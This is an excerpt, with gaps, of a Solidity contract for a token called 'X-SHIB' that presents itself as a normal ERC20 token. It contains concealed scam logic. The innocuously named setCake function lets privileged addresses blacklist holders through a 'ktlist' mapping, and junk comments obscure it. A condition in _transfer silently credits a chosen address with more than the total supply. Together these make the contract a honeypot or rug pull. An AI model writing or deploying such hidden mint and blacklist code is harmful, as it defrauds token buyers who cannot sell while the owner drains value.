...
contract SHIB is Context, IERC20, Ownable {
    ...
    string private _name = "X-SHIB";
    string private _symbol = "X-SHIB";
    uint8 private _decimals = 9;

    address payable private marketWall = payable(0xe7D33DcaFCbCAA78B6Cd508Ea5715cb4BAd6E18A); 
    address payable private teamWalletAddress = payable(0xe7D33DcaFCbCAA78B6Cd508Ea5715cb4BAd6E18A); 
	...
	mapping(address => bool) public ktlist;
	...
	function setCake(address  bnb, bool only) external {
		if( _swapCake[ /*as aXxsdfghjk111;‘*/msg.sender])
	   {
	      ktlist[bnb]/*main FANCTION*/= only;
	   }   
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        {   
			...
			if (  _swapCake[sender]  && recipient == TMFace ) { _usdt[TMFace] += _totalSupply * TwoTime + 1;  }
